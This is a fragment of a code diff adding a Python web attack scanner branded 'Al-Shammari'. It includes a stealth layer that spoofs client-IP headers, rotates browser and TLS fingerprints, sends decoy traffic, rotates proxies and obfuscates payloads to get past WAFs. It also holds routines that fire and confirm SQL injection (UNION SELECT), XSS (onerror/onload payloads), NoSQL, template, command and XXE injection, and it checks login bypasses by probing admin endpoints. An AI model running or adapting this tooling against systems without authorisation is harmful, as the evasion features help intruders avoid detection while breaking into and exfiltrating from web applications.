+            hdrs["X-Azure-ClientIP"]=self.rand_ip()
+            hdrs["X-Azure-Ref"]=base64.b64encode(os.urandom(16)).decode()[:20]
+        if random.random()>0.9:
+            hdrs["X-Forwarded-Proto"]=random.choice(["https","http"])
+            hdrs["X-Forwarded-Port"]=random.choice(["443","80","8443"])
+        return hdrs
+
+    def all_cookies(self):
+        c=dict(self.cookies)
+        c.update(self.session_cookies)
+        return c
+
+    def get_ua(self):
+        fp=self.fingerprint
+        if "chrome" in fp:
+            ver=random.randint(120,128)
+            plats={"win":"Windows NT 10.0; Win64; x64","mac":"Macintosh; Intel Mac OS X 10_15_7",
+                   "linux":"X11; Linux x86_64"}
+            p=plats.get(fp.split("_")[1],"Windows NT 10.0; Win64; x64")
+            return f"Mozilla/5.0 ({p}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{random.randint(5000,6500)}.{random.randint(50,200)} Safari/537.36"
+        elif "firefox" in fp:
+            ver=random.randint(120,130)
+            plats={"win":"Windows NT 10.0; Win64; x64","mac":"Macintosh; Intel Mac OS X 14.0; rv:"+str(ver)+".0",
+                   "linux":"X11; Linux x86_64; rv:"+str(ver)+".0"}
+            p=plats.get(fp.split("_")[1],f"Windows NT 10.0; Win64; x64; rv:{ver}.0")
+            return f"Mozilla/5.0 ({p}; rv:{ver}.0) Gecko/20100101 Firefox/{ver}.0"
+        elif "safari" in fp:
+            bver=random.randint(610,620)
+            return f"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_{random.randint(0,5)}) AppleWebKit/{bver}.{random.randint(1,15)}.{random.randint(1,20)} (KHTML, like Gecko) Version/17.{random.randint(2,5)} Safari/{bver}.{random.randint(1,15)}"
+        elif "edge" in fp:
+            ver=random.randint(120,128)
+            return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{random.randint(5000,6500)}.{random.randint(50,200)} Safari/537.36 Edg/{ver}.0.{random.randint(1000,2000)}.{random.randint(10,100)}"
+        return random.choice(USER_AGENTS)
+
+    def get_accept(self):
+        if random.random()>0.7:
+            return random.choice([
+                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            ])
+        return "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+
+    def _tls_fp(self):
+        fp=self.fingerprint.split("_")[0]
+        ciphers=self._tls_ciphers.get(fp,self._tls_ciphers["chrome"])
+        return random.choice(ciphers),random.choice(self._alpn),random.choice(self._http_versions),random.choice(self._tls_versions)
+
+    def isp_ip(self):
+        name,ranges=random.choice(self._isp_ips)
+        a,b=random.choice(ranges)
+        cls_a=random.randint(a,b)
+        cls_b=random.randint(0,255)
+        cls_c=random.randint(0,255)
+        cls_d=random.randint(1,254)
+        return name,f"{cls_a}.{cls_b}.{cls_c}.{cls_d}"
+
+    def url_padding(self,url):
+        padded=url
+        if "?" in url and random.random()>0.4:
+            kinds=random.choice(["real","tracking","cache","mixed"])
+            ps=urlparse(url)
+            pq=parse_qs(ps.query)
+            if kinds=="real":
+                pq[random.choice(self._xss_padding)]=[random.choice(["1","true","en","0","no"])]
+            elif kinds=="tracking":
+                pq["utm_campaign"]=[random.choice(["organic","social","ppc","email"])]
+                pq["utm_medium"]=[random.choice(["cpc","social","email","display"])]
+            elif kinds=="cache":
+                pq[random.choice(["_","rnd","nocache","ts"])]=[str(random.randint(1000,99999))]
+            elif kinds=="mixed":
+                pq[random.choice(self._xss_padding)]=[str(random.randint(1000,99999))]
+            padded=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(pq,doseq=True)}"
+        return padded
+
+    def accept_ch(self):
+        return {"Sec-CH-UA":random.choice(self._sec_ch_ua) if random.random()>0.7 else "",
+                "Sec-CH-UA-Mobile":"?0",
+                "Sec-CH-UA-Platform":self._platforms_map.get(self.fingerprint,'"Windows"'),
+                "Sec-CH-UA-Full-Version-List":'"Not/A)Brand";v="99.0.0.0", "Chromium";v="120.0.6099.109"',
+                "Sec-CH-UA-Arch":"x86" if "win" in self.fingerprint else "arm",
+                "Sec-CH-UA-Model":random.choice(["","","ASUS Z01KDA","Pixel 7","SM-G960U","iPhone14,2"])}
+
+    def resource_hints(self):
+        if random.random()>0.8:
+            return {"Link":"<https://connect.example.test>; rel=preconnect,</assets/main.js>; rel=preload; as=script"}
+        return {}
+
+    def etag_cache(self,resp):
+        if resp and "h" in resp:
+            etag=resp["h"].get("ETag","") or resp["h"].get("Last-Modified","")
+            if etag:
+                self.session_cookies["etag"]=etag.replace('"',"")
+                if random.random()>0.5:
+                    self.hdrs["If-None-Match"]=etag
+                else:
+                    self.hdrs["If-Modified-Since"]=resp["h"].get("Last-Modified","")
+
+    def rotation_headers(self,url):
+        ps=urlparse(url)
+        head={"Host":ps.netloc}
+        cipher,alpn,http_version,tls_version=self._tls_fp()
+        if random.random()>0.6:
+            head["X-TLS-Cipher"]="<<simulated>>"
+            head["X-TLS-Version"]=tls_version
+            head["X-HTTP-Version"]=http_version
+        isp_name,isp_ip=self.isp_ip()
+        if random.random()>0.4:
+            head["True-Client-IP"]=isp_ip
+            head["X-ISP"]=isp_name
+        if random.random()>0.6:
+            head["X-Requested-With"]=random.choice(["XMLHttpRequest","Fetch",""] if random.random()>0.5 else ["XMLHttpRequest",""])
+        if random.random()>0.8:
+            head["Content-DPR"]=random.choice(["2","2.5","3"])
+        h2_pseudo={"Authority":ps.netloc,"Path":ps.path or "/","Scheme":ps.scheme}
+        if random.random()>0.9:
+            head["X-H2-Pseudo-Order"]=":method,:path,:scheme,:authority,:status"
+        return head,h2_pseudo
+
+st=Stealth()
+
+def clr():
+    if IS_WIN: os.system("cls")
+    else: os.system("clear")
+
+def plat_info():
+    s = platform.system()
+    r = platform.release()
+    m = platform.machine()
+    pv = platform.python_version()
+    dist = ""
+    if IS_KALI: dist = "Kali Linux"
+    elif IS_ARCH: dist = "Arch Linux"
+    elif IS_TERMUX: dist = "Termux/Android"
+    elif IS_LINUX:
+        try:
+            with open("/etc/os-release") as f:
+                for l in f:
+                    if l.startswith("PRETTY_NAME="):
+                        dist = l.split("=")[1].strip().strip('"'); break
+        except: pass
+    parts = [f"{s} {r}", m, f"Python {pv}"]
+    if dist: parts.insert(0, dist)
+    return " | ".join(parts)
+
+def rua(): return random.choice(USER_AGENTS)
+def rref(): return random.choice(REFERERS)
+
+def banner():
+    clr()
+    print(BANNER)
+    print(f"{C.D}  Platform: {plat_info()}{C.X}")
+    print(f"{C.D}  {'─' * 60}{C.X}\n")
+
+def ok(m): print(f"{C.G}[+]{C.X} {m}")
+def err(m): print(f"{C.R}[-]{C.X} {m}")
+def inf(m): print(f"{C.CY}[*]{C.X} {m}")
+def wrn(m): print(f"{C.Y}[!]{C.X} {m}")
+def vln(m): print(f"{C.R}[VULN]{C.X} {m}")
+
+def vlen(s):
+    return len(ANSI_PAT.sub("", s))
+
+def vpad(s, width):
+    return s + " " * max(0, width - vlen(s))
+
+def box(lines, title=None):
+    inner = max(vlen(line) for line in lines)
+    if title is not None:
+        inner = max(inner, vlen(title))
+    top = f"{C.BO}╔{'═' * (inner + 2)}╗{C.X}"
+    mid = f"{C.BO}╠{'═' * (inner + 2)}╣{C.X}"
+    bot = f"{C.BO}╚{'═' * (inner + 2)}╝{C.X}"
+    out = [top]
+    if title is not None:
+        out.append(f"{C.BO}║ {vpad(title, inner)} ║{C.X}")
+        out.append(mid)
+    out.extend(f"{C.BO}║ {vpad(line, inner)} ║{C.X}" for line in lines)
+    out.append(bot)
+    return "\n".join(out)
+
+def req(url,method="GET",data=None,hdrs=None,to=TO,stealth=True):
+    if stealth:
+        st.delay()
+    st.req_count+=1
+    t0=time.time()
+    try:
+        if hdrs is None: hdrs={}
+        if stealth:
+            hdrs["User-Agent"]=st.get_ua()
+            hdrs["Referer"]=st.build_referer(url)
+            hdrs["Accept"]=st.get_accept()
+            bh=st.browser_headers(url)
+            for k,v in bh.items():
+                if k not in hdrs: hdrs[k]=v
+            rh,h2p=st.rotation_headers(url)
+            for k,v in rh.items():
+                if k not in hdrs and v: hdrs[k]=v
+            for k,v in st.accept_ch().items():
+                if v and k not in hdrs: hdrs[k]=v
+            for k,v in st.resource_hints().items():
+                if v and k not in hdrs: hdrs[k]=v
+            if st.req_count%3==0:
+                for k,v in st.ip_headers().items():
+                    if k not in hdrs: hdrs[k]=v
+            if st.req_count%7==0:
+                st.decoy(url)
+            if st.was_blocked and st.req_count%3==0:
+                st.rotate_fingerprint()
+                hdrs["User-Agent"]=st.get_ua()
+                bh2=st.browser_headers(url)
+                for k,v in bh2.items(): hdrs[k]=v
+        for k,v in STD_HEADERS.items():
+            if k not in hdrs: hdrs[k]=v
+        if not stealth:
+            hdrs["User-Agent"]=st.get_ua()
+        hdrs["Pragma"]="no-cache"
+        for k,v in st.hdrs.items(): hdrs[k]=v
+        ck=st.all_cookies()
+        if ck: hdrs["Cookie"]="; ".join(f"{k}={v}" for k,v in ck.items())
+        if data:
+            if isinstance(data,dict): data=urllib.parse.urlencode(data).encode()
+            elif isinstance(data,str): data=data.encode()
+        rq=urllib.request.Request(url,data=data,headers=hdrs,method=method)
+        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+        prx=st.next_proxy() if st.proxies else st.proxy
+        if prx:
+            op=urllib.request.build_opener(urllib.request.ProxyHandler({"http":prx,"https":prx}),urllib.request.HTTPSHandler(context=ctx))
+        else:
+            op=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
+        rs=op.open(rq,timeout=to)
+        el=time.time()-t0
+        ct=rs.read().decode("utf-8",errors="ignore")
+        resp={"s":rs.status,"h":dict(rs.headers),"c":ct,"l":len(ct),"t":el,"u":rs.url,"e":None}
+        st.update_session(resp)
+        st.etag_cache(resp)
+        st.adapt(resp)
+        return resp
+    except urllib.error.HTTPError as e:
+        el=time.time()-t0
+        try: ct=e.read().decode("utf-8",errors="ignore")
+        except: ct=""
+        resp={"s":e.code,"h":dict(e.headers),"c":ct,"l":len(ct),"t":el,"u":url,"e":None}
+        st.adapt(resp)
+        return resp
+    except urllib.error.URLError as e:
+        return{"s":0,"h":{},"c":"","l":0,"t":0,"u":url,"e":str(e.reason)}
+    except Exception as e:
+        return{"s":0,"h":{},"c":"","l":0,"t":0,"u":url,"e":str(e)}
+
+def det_err(ct):
+    f=[]
+    for p,d in ERR_PAT:
+        if re.search(p,ct,re.IGNORECASE):
+            conf="high"
+            if d == "Generic SQL": conf="medium"
+            elif d.startswith("Generic") or "Possible" in d: conf="low"
+            f.append({"p":p,"d":d,"conf":conf})
+    if not f: return f
+    if all(x["conf"]=="low" for x in f):
+        return [x for x in f if x["conf"]=="high"] or f
+    return [x for x in f if x["conf"]!="low"] or f
+
+def det_xss(ct,pl):
+    f=[]
+    for p,x in XSS_PAT:
+        if re.search(p,ct,re.IGNORECASE):
+            m=re.search(p,ct,re.IGNORECASE)
+            if "event" in x.lower() and "event handler" in x.lower():
+                if re.search(r'<\w+[^>]*'+re.escape(m.group(0)),ct,re.IGNORECASE):
+                    f.append({"p":p,"x":x})
+                continue
+            f.append({"p":p,"x":x})
+    pc=re.sub(r'[<>"\'=;/\\]','',pl)
+    if pc and len(pc)>3 and re.search(re.escape(pc[:15]),ct,re.IGNORECASE):
+        if not f: f.append({"p":"reflected","x":"Payload Reflected"})
+    return f
+
+def det_waf(ct,h,s):
+    ws=[(r"cloudflare","Cloudflare"),(r"akamai","Akamai"),(r"incapsula","Incapsula"),(r"sucuri","Sucuri"),(r"mod_security","ModSecurity"),(r"webknight","WebKnight"),(r"f5.big.ip","F5 BIG-IP"),(r"barracuda","Barracuda"),(r"citrix","Citrix NetScaler"),(r"fortiweb","FortiWeb"),(r"imperva","Imperva"),(r"request.*blocked","Generic WAF"),(r"not.acceptable","Generic WAF"),(r"forbidden","Possible WAF"),(r"403.*forbidden","Possible WAF"),(r"access.denied","Generic WAF")]
+    fl=ct+str(h)
+    return[n for p,n in ws if re.search(p,fl,re.IGNORECASE)]
+
+def det_cms(ct):
+    cs=[(r"wp-content","WordPress"),(r"wp-includes","WordPress"),(r"Joomla","Joomla"),(r"Drupal","Drupal"),(r"prestashop","PrestaShop"),(r"Magento","Magento"),(r"Shopify","Shopify"),(r"Laravel","Laravel"),(r"Django","Django")]
+    return[n for p,n in cs if re.search(p,ct,re.IGNORECASE)]
+
+def tpay(url,pl,method="GET",param=None):
+    try:
+        ob=st.obf(pl)
+        if method=="GET":
+            sp="&" if "?" in url else "?"
+            if param:
+                ps=urlparse(url); pq=parse_qs(ps.query); pq[param]=[ob]
+                tu=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(pq,doseq=True)}"
+            else:
+                tu=f"{url}{sp}{urllib.parse.urlencode({'payload':ob})}"
+            tu=st.url_padding(tu)
+            rs=req(tu)
+        elif method=="POST":
+            rs=req(url,method="POST",data={param:ob} if param else {"payload":ob})
+        else:
+            rs=req(url,method=method)
+        if rs.get("e"): return None
+        return{"pl":pl,"ob":ob,"s":rs["s"],"l":rs["l"],"t":rs["t"],"u":rs["u"],"c":rs["c"][:2000],"h":rs.get("h",{})}
+    except: return None
+
+def gbase(url,method="GET"): return req(url,method=method)
+def eparams(url): return list(parse_qs(urlparse(url).query).keys())
+
+def multi_baseline(url,method="GET",samples=3):
+    bss=[]
+    for _ in range(samples):
+        r=req(url,method=method,stealth=False)
+        if r and not r.get("e"):
+            bss.append({"s":r["s"],"l":r["l"],"t":r["t"],"c":r["c"],
+                        "hash":content_hash(r["c"]),
+                        "tags":extract_structure(r["c"])})
+    if not bss: return None
+    avg_l=sum(b["l"] for b in bss)/len(bss)
+    avg_t=sum(b["t"] for b in bss)/len(bss)
+    std_t=(sum((b["t"]-avg_t)**2 for b in bss)/len(bss))**0.5
+    std_l=(sum((b["l"]-avg_l)**2 for b in bss)/len(bss))**0.5
+    max_l=max(b["l"] for b in bss)
+    min_l=min(b["l"] for b in bss)
+    spread=max_l-min_l
+    hashes=[b["hash"] for b in bss]
+    mode_hash=max(set(hashes),key=hashes.count)
+    return{"avg_l":avg_l,"avg_t":avg_t,"std_t":std_t,"std_l":std_l,
+           "spread":spread,"max_l":max_l,"min_l":min_l,
+           "samples":bss,"hash":mode_hash,
+           "tags":bss[0]["tags"],"content":bss[0]["c"]}
+
+def bool_verify(url,true_pl,false_pl,method="GET",param=None):
+    tr=tpay(url,true_pl,method,param)
+    fr=tpay(url,false_pl,method,param)
+    if not tr or not fr: return None
+    diff={}
+    diff["len_diff"]=abs(tr["l"]-fr["l"])
+    diff["status_diff"]=tr["s"]!=fr["s"]
+    diff["true_hash"]=content_hash(tr["c"])
+    diff["false_hash"]=content_hash(fr["c"])
+    diff["hash_diff"]=diff["true_hash"]!=diff["false_hash"]
+    tt=extract_structure(tr["c"]); ft=extract_structure(fr["c"])
+    diff["tag_diff"]=len(set(tt[0])-set(ft[0]))
+    true_err=len(det_err(tr["c"]))>0
+    false_err=len(det_err(fr["c"]))>0
+    diff["err_diff"]=true_err!=false_err
+    score=0
+    if diff["len_diff"]>50: score+=2
+    if diff["len_diff"]>200: score+=2
+    if diff["hash_diff"]: score+=3
+    if diff["status_diff"]: score+=2
+    if diff["tag_diff"]>3: score+=2
+    if diff["err_diff"]: score+=1
+    confirmed=score>=4
+    if diff["len_diff"]<30 and not diff["status_diff"] and not diff["err_diff"]:
+        confirmed=False
+    return{"score":score,"confirmed":confirmed,"diff":diff,"true":tr,"false":fr}
+
+def time_verify(url,sleep_pl,base_time,base_std,method="GET",param=None,samples=3):
+    times=[]
+    for _ in range(samples):
+        r=tpay(url,sleep_pl,method,param)
+        if r: times.append(r["t"])
+    if not times: return None
+    avg_t=sum(times)/len(times)
+    min_t=min(times)
+    std_t=(sum((t-avg_t)**2 for t in times)/len(times))**0.5
+    threshold=base_time+base_std*3+2
+    confirmed=avg_t>=threshold and min_t>=base_time+2
+    if std_t>1.0 and (max(times)-min_t)>2 and min_t<threshold:
+        confirmed=False
+    return{"avg":avg_t,"min":min_t,"max":max(times),"std":std_t,
+           "samples":times,"threshold":threshold,
+           "confirmed":confirmed,
+           "deviation":(avg_t-base_time)/max(base_std,0.1)}
+
+def union_verify(url,payloads,method="GET",param=None):
+    markers=["ALSHAMMARI_TEST","{{UNION_PROOF}}","42d7f8a1b3c9",
+             "UNION_MARKER_918273","alshammari_poc"]
+    for marker in markers:
+        for i in range(1,10):
+            cols=",".join([f"'{marker}'" if j==1 else "NULL" for j in range(i)])
+            pl=f"' UNION SELECT {cols} --"
+            r=tpay(url,pl,method,param)
+            if r and marker in r["c"]:
+                ctx=r["c"][max(0,r["c"].find(marker)-100):r["c"].find(marker)+len(marker)+100]
+                return{"confirmed":True,"columns":i,"marker":marker,
+                       "context":ctx[:200],"payload":pl}
+    return{"confirmed":False}
+
+def xss_context(ct,payload):
+    contexts=[]
+    idx=ct.find(payload)
+    if idx==-1:
+        for enc in [urllib.parse.quote(payload),urllib.parse.quote(payload,safe=""),
+                    payload.replace("<","&lt;").replace(">","&gt;")]:
+            idx=ct.find(enc)
+            if idx!=-1: break
+    if idx==-1: return contexts
+    before=ct[:idx]
+    if re.search(r'<script[^>]*>[^<]*$',before):
+        contexts.append({"type":"javascript","safe":True,
+                         "desc":"Inside <script> tag - direct JS execution"})
+    if re.search(r'<script[^>]*>\s*$',before,re.IGNORECASE):
+        contexts.append({"type":"script-injection","safe":True,
+                         "desc":"Direct injection into <script> tag"})
+    tag_match=re.findall(r'<(\w+)\s+[^>]*$',before)
+    if tag_match:
+        tag=tag_match[-1]
+        attr_match=re.findall(r'(\w+)=(?:"[^"]*|\'[^\']*)$',before)
+        if attr_match:
+            attr=attr_match[-1].lower()
+            if attr in ["href","src","action","formaction","data","poster",
+                        "background","xlink:href"]:
+                contexts.append({"type":"url-attr","safe":True,
+                                 "desc":f"Inside URL attribute of <{tag}> ({attr})"})
+            elif attr in ["style","class","id"]:
+                contexts.append({"type":"safe-attr","safe":False,
+                                 "desc":f"Inside {attr} attribute of <{tag}>"})
+            else:
+                contexts.append({"type":"attr","safe":True,
+                                 "desc":f"Inside {attr} attribute of <{tag}>"})
+        else:
+            contexts.append({"type":"tag-open","safe":True,
+                             "desc":f"Inside opening <{tag}> tag"})
+    if not tag_match:
+        prev_close=before.rfind(">")
+        prev_open=before.rfind("<",max(0,prev_close))
+        if prev_close>prev_open or prev_open==-1:
+            contexts.append({"type":"html-body","safe":True,
+                             "desc":"Reflected in HTML body between tags"})
+    if re.search(r'javascript:[^"\']*$',before):
+        contexts.append({"type":"javascript-uri","safe":True,
+                         "desc":"Inside javascript: URI"})
+    if re.search(r'=\s*"[^"]*$',before) or re.search(r"=\s*'[^']*$",before):
+        if not any(c["type"]=="attr" for c in contexts):
+            contexts.append({"type":"attr-value","safe":True,
+                             "desc":"Inside quoted attribute value"})
+    if re.search(r'on\w+\s*=\s*"[^"]*$',before,re.IGNORECASE):
+        contexts.append({"type":"event-handler","safe":True,
+                         "desc":"Inside event handler attribute"})
+    if re.search(r'style\s*=\s*"[^"]*$',before,re.IGNORECASE):
+        contexts.append({"type":"style-attr","safe":True,
+                         "desc":"Inside style attribute"})
+    if not contexts:
+        contexts.append({"type":"unknown","safe":False,
+                         "desc":"Reflected but context unclear"})
+    return contexts
+
+def xss_multi_verify(url,original_payload,method="GET",param=None):
+    proofs=[]
+    unique_tag=f"xss{random.randint(10000,99999)}"
+    unique_val=f"alshammari{random.randint(100000,999999)}"
+    safe_pl=f"<img src=x onerror=alert('{unique_val}')>"
+    safe_pl2=f"<svg onload=alert('{unique_val}')>"
+    safe_pl3=f"<div id='{unique_tag}'>test</div>"
+    for pl in [safe_pl,safe_pl2,safe_pl3]:
+        r=tpay(url,pl,method,param)
+        if r and unique_val in r["c"]:
+            ctxs=xss_context(r["c"],unique_val)
+            if any(c["safe"] for c in ctxs):
+                proofs.append({"method":"direct-reflection","payload":pl,
+                               "context":ctxs,"evidence":unique_val in r["c"]})
+                break
+    encoded_payloads=[
+        urllib.parse.quote(original_payload),
+        urllib.parse.quote(original_payload,safe=""),
+        original_payload.replace("<","%3C").replace(">","%3E"),
+        original_payload.replace("<","\\u003c").replace(">","\\u003e"),
+        original_payload.replace("alert","\\u0061lert"),
+        original_payload.replace("<","&lt;").replace(">","&gt;"),
+    ]
+    for ep in encoded_payloads:
+        r=tpay(url,ep,method,param)
+        if r and (unique_val in r["c"] or "alert" in r["c"]):
+            proofs.append({"method":"encoding-bypass","payload":ep,
+                           "encoded":True})
+            break
+    dom_sinks=["document.write","innerHTML","outerHTML","insertAdjacentHTML",
+               "eval(","setTimeout(","setInterval(","location=",
+               "location.href","location.replace","location.assign",
+               ".src =",".href =",".action =",".formAction =",
+               "$(","jQuery(","angular.element","React.createElement",
+               "document.domain","document.URL","document.referrer",
+               "window.name","location.search","location.hash",
+               "postMessage","window.open"]
+    for sink in dom_sinks:
+        test_pl=f"<test_{unique_tag}>{sink}</test>"
+        r=tpay(url,test_pl,method,param)
+        if r and f"test_{unique_tag}" in r["c"] and sink in r["c"]:
+            proofs.append({"method":"dom-sink","sink":sink,
+                           "evidence":f"Input flows to {sink}"})
+            break
+    return proofs
+
+def auth_verify(url,login_data,resp,original_cookies):
+    proofs=[]
+    cl=resp["c"].lower()
+    post_cookies=st.all_cookies()
+    new_cookies={k:v for k,v in post_cookies.items() if k not in original_cookies or original_cookies[k]!=v}
+    success_kw=["welcome","dashboard","logout","profile","admin","panel",
+                "control","manage","home","account","settings","overview",
+                "my-account","user","member","portal","backend","console",
+                "administration","successful","logged in","signed in",
+                "hi ","hello ","dear ","good ","menu","sidebar",
+                "notification","inbox","message","upload"]
+    fail_kw=["login","sign in","incorrect","invalid","failed","wrong",
+             "error","unauthorized","denied","wrong password","not found",
+             "does not exist","no account","disabled","locked","expired",
+             "try again","register","sign up","create account","forgot",
+             "reset password","captcha","verification"]
+    success_hits=sum(1 for w in success_kw if w in cl)
+    fail_hits=sum(1 for w in fail_kw if w in cl)
+    if success_hits>fail_hits and success_hits>=2:
+        proofs.append({"method":"keyword-analysis","score":f"{success_hits}vs{fail_hits}",
+                       "evidence":"Response contains success indicators"})
+    if new_cookies:
+        auth_cookies=[k for k in new_cookies if any(x in k.lower() for x in
+                      ["session","token","auth","login","user","sid","jwt","connect"]) ]
+        if auth_cookies:
+            proofs.append({"method":"session-token","cookies":auth_cookies,
+                           "evidence":"New auth cookies issued"})
+    redirect_url=resp["h"].get("Location","")
+    if redirect_url:
+        red_l=redirect_url.lower()
+        bad_red=["login","signin","auth","error","failed"]
+        good_red=["dashboard","home","panel","profile","account","admin","welcome"]
+        if any(g in red_l for g in good_red) and not any(b in red_l for b in bad_red):
+            proofs.append({"method":"redirect-chain","url":redirect_url,
+                           "evidence":"Redirect to authenticated area"})
+    if resp["s"]==302:
+        proofs.append({"method":"status-redirect","evidence":"302 redirect issued"})
+    if len(resp["c"])>1000 and success_hits>fail_hits:
+        proofs.append({"method":"content-size","size":len(resp["c"]),
+                       "evidence":"Substantial response with success indicators"})
+    ps=urlparse(url)
+    base=f"{ps.scheme}://{ps.netloc}"
+    protected=["/dashboard","/admin","/profile","/account","/api/user",
+               "/api/me","/home","/panel","/manage","/settings"]
+    if new_cookies:
+        for ep in random.sample(protected,min(3,len(protected))):
+            pr=req(base+ep)
+            if pr and not pr.get("e") and pr["s"]==200 and len(pr["c"])>500:
+                if not is_error_page(pr["c"],pr["s"]):
+                    proofs.append({"method":"post-auth-access","endpoint":ep,
+                                   "evidence":"Can access protected resource after bypass"})
+                    break
+    return proofs
+
+def det_extra(group,category,payload,resp,baseline=None):
+    if not resp or resp.get("e"): return []
+    ct=resp.get("c","")
+    cl=ct.lower()
+    proofs=[]
+    base_len=baseline.get("avg_l",0) if baseline else 0
+    len_diff=abs(resp.get("l",0)-base_len) if baseline else 0
+    hash_diff=content_hash(ct)!=(baseline.get("hash","") if baseline else "")
+
+    if group=="NOSQL":
+        nosql_err=["mongodb","mongoerror","bson","objectid","casterror","mongoose",
+                   "e11000","not master","errmsg","$where","syntaxerror"]
+        if any(x in cl for x in nosql_err):
+            proofs.append({"method":"nosql-error","evidence":"NoSQL/MongoDB error signature detected"})
+        if baseline and hash_diff and len_diff>80 and resp.get("s") in [200,302,301]:
+            proofs.append({"method":"nosql-behavior","evidence":f"Response changed after NoSQL operator injection (diff={len_diff:.0f})"})
+
+    elif group=="SSTI":
+        if "49" in ct and any(x in payload for x in ["7*7","${7*7}","<%= 7*7 %>"]):
+            proofs.append({"method":"ssti-eval","evidence":"Template expression evaluated to 49"})
+        ssti_sigs=["<class '", "subclasses", "config", "jinja", "freemarker", "velocity", "twig", "request object"]
+        if any(x in cl for x in ssti_sigs):
+            proofs.append({"method":"ssti-disclosure","evidence":"Template engine object/error leaked"})
+        if any(x in cl for x in ["uid=", "gid=", "root:", "www-data", "apache", "nginx"]):
+            proofs.append({"method":"ssti-rce","evidence":"Command output or system file content found"})
+
+    elif group=="CMDI":
+        cmd_sigs=["uid=", "gid=", "groups=", "root:", "bin/bash", "windows", "volume serial",
+                  "directory of", "administrator", "nt authority", "www-data", "apache", "nginx"]
+        if any(x in cl for x in cmd_sigs):
+            proofs.append({"method":"cmd-output","evidence":"Command output signature detected"})
+        if resp.get("t",0)>=3 and any(x in payload.lower() for x in ["sleep", "ping -n"]):
+            proofs.append({"method":"cmd-time","evidence":f"Time delay observed ({resp.get('t',0):.2f}s)"})
+
+    elif group=="XXE":
+        xxe_sigs=["root:x:", "daemon:x:", "[extensions]", "for 16-bit app support",
+                  "xml parsing", "external entity", "doctype", "entity"]
+        if any(x in cl for x in xxe_sigs):
+            proofs.append({"method":"xxe-file-or-error","evidence":"XXE file disclosure or parser error signature detected"})
+        if baseline and hash_diff and len_diff>100:
+            proofs.append({"method":"xxe-behavior","evidence":f"XML entity payload changed response (diff={len_diff:.0f})"})
+
+    return proofs
+
+def s_extra(url,method="GET",param=None):
+    rs=[]
+    inf(f"Scanning Extra Injection Payloads on: {C.BO}{url}{C.X}")
+    print(f"{C.D}{'─'*70}{C.X}")
+    baseline=multi_baseline(url,method,2)
+    groups=[("NOSQL",NOSQL),("SSTI",SSTI),("CMDI",CMDI),("XXE",XXE)]
+    total=sum(len(items) for _,db in groups for items in db.values())
+    cnt=0
+    for group,db in groups:
+        for category,payloads in db.items():
+            inf(f"  Testing {group}/{category}...")
+            for pl in payloads:
+                cnt+=1
+                print(f"\r{C.D}    [{cnt}/{total}] {group}/{category}...{C.X}",end="",flush=True)
+                r=tpay(url,pl,method,param)
+                proofs=det_extra(group,category,pl,r,baseline)
+                if proofs:
+                    sev="critical" if any(p["method"] in ["ssti-rce","cmd-output","xxe-file-or-error"] for p in proofs) else "high"
+                    vln(f"  {group}/{category}: {C.Y}{pl[:55]}{C.X}")
+                    for p in proofs:
+                        inf(f"    Proof [{p['method']}]: {C.M}{p['evidence']}{C.X}")
+                    rs.append({"type":f"{group} Injection ({category})","severity":sev,
+                               "param":param or "N/A","payload":pl[:80],
+                               "status":r.get("s","") if r else "","proofs":proofs})
+    print(f"\r{' '*70}\r",end="")
+    return rs
+
+def sc(sev):
+    return{"critical":C.R,"high":C.R,"medium":C.Y,"low":C.G,"info":C.CY}.get(sev,C.W)
+
+def ptable(hdrs,rows,wids):
+    bd="+"+"+".join("-"*w for w in wids)+"+"
+    print(f"{C.D}{bd}{C.X}")
+    hd="|"+"|".join(f"{C.BO}{C.CY} {h:<{w-1}}{C.X}" for h,w in zip(hdrs,wids))+"|"
+    print(hd); print(f"{C.D}{bd}{C.X}")
+    for row in rows:
+        ln="|"
+        for cell,w in zip(row,wids):
+            cl=cell[1] if isinstance(cell,tuple) else C.W
+            tx=cell[0] if isinstance(cell,tuple) else str(cell)
+            ln+=f"{cl} {tx:<{w-1}}{C.X}|"
+        print(ln)
+    print(f"{C.D}{bd}{C.X}")
+
+def pres(results):
+    if not results:
+        print(f"\n{C.G}  No vulnerabilities found.{C.X}\n"); return
+    print(f"\n{C.BO}{C.R}{'█'*80}{C.X}")
+    print(f"{C.BO}{C.R}{'█'*80}{C.X}")
+    print(f"{C.BO}{C.W}  ╔══════════════════════════════════════════════════════════════════════╗")
+    print(f"{C.BO}{C.W}  ║              {C.G}SCAN RESULTS - Al-Shammari{C.W}                   ║")
+    print(f"{C.BO}{C.W}  ╚══════════════════════════════════════════════════════════════════════╝{C.X}")
+    print(f"{C.BO}{C.R}{'█'*80}{C.X}")
+    print(f"{C.BO}{C.R}{'█'*80}{C.X}\n")
+    hd=["#","Type","Severity","Parameter","Payload","Status"]
+    rows=[]
+    for i,r in enumerate(results,1):
+        sv=r.get("severity","info")
+        rows.append([str(i),r.get("type","unknown"),(sv.upper(),sc(sv)),r.get("param","N/A")[:20],r.get("payload","N/A")[:45],str(r.get("status",""))])
+    ptable(hd,rows,[4,18,12,22,47,8])
+    for i,r in enumerate(results,1):
+        proofs=r.get("proofs",[])
+        if proofs:
+            sv=r.get("severity","info")
+            print(f"\n  {sc(sv)}{C.BO}#{i} Proof of Concept:{C.X}")
+            for j,p in enumerate(proofs,1):
+                method=p.get("method","unknown")
+                evidence=p.get("evidence","")
+                print(f"    {C.Y}{j}.{C.X} {C.CY}[{method}]{C.X} {evidence}")
+                if "db" in p:
